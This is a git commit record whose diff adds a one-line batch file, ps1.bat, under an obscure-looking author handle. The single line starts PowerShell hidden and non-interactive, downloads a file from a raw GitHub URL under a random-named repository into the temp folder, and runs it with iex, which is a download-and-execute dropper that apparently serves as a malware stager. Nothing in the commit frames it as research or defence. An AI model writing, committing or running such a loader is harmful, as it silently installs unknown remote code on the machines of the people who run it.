4a6db16157fe7b6d57b5db759483b82b5955325d
3287d54n23743 <oniborya1337@proton.me>
2026-08-29 22:09:12 +0200

    Update and rename ps1.ps1 to ps1.bat

---
+++ ps1.bat
@@ -0,0 +1,1 @@
+powershell -NoP -NonI -W Hidden -Command "$p=\"$env:TEMP\load.ps1\";(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/3287d54n23743/8er7ct7f5/main/i.bat',$p);iex (Get-Content $p -Raw)"
